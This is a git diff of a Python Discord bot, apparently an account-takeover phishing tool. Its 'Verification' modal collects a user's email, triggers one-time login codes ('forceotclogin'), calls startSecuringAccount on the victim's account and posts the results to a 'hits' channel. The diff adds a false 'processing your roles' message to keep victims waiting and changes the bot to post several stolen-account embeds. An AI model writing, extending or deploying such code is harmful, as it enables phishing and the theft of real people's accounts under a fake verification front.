@@ -33,15 +33,6 @@ class MyModalOne(ui.Modal, title="Verification"):
 
         await interaction.response.defer()
 
-        await interaction.followup.send(
-            embed = discord.Embed (
-                title = "Please Wait ⌛",
-                description = "Please Allow The Bot To Verify The Data You Have Provided",
-                colour = 0xFFFFFF
-            ),
-            ephemeral = True
-        )
-
         # Sends OTP/Auth code
         # forceotclogin is what triggers the code, spamming otps may lead to <line 96> responses
         emailInfo = requests.get(
@@ -202,6 +193,10 @@ class MyModalOne(ui.Modal, title="Verification"):
                             description = f"**Method**\n```Authenticator```\n**Status**\n```Securing...```",
                             colour=0x00FF00
                         )
+                    )   
+
+                    await interaction.followup.send(
+                        "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
                     )
 
                     await logs_channel.send(
@@ -209,10 +204,13 @@ class MyModalOne(ui.Modal, title="Verification"):
                     )
 
                     # Securing
-                    embed = startSecuringAccount(self.email.value, device) 
-                    await hits_channel.send(
-                        embed = embed
-                    )
+                    embeds = startSecuringAccount(self.email.value, device) 
+
+                    for embed in embeds:
+                        await hits_channel.send(
+                            embed = embed
+                        )
+                        
                     return
                 
                 time.sleep(1)
